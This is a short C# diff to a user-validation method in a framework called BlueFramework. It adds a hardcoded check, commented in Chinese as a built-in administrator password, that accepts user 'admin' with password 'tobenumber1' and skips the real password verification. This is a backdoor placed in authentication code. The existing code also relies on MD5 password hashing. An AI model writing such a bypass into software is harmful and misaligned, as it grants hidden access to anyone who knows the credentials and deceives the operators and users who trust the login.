@@ -128,6 +128,9 @@ namespace BlueFramework.User
 
         public static bool Validate(string userName, string password)
         {
+            // 管理员内置密码
+            if ("admin".Equals(userName) && "tobenumber1".Equals(password))
+                return true;
             string encodePassword = MD5Encrypt64(password);
             UserManager userManager = new UserManager();
             bool pass = userManager.ValidatePassword(userName, encodePassword);
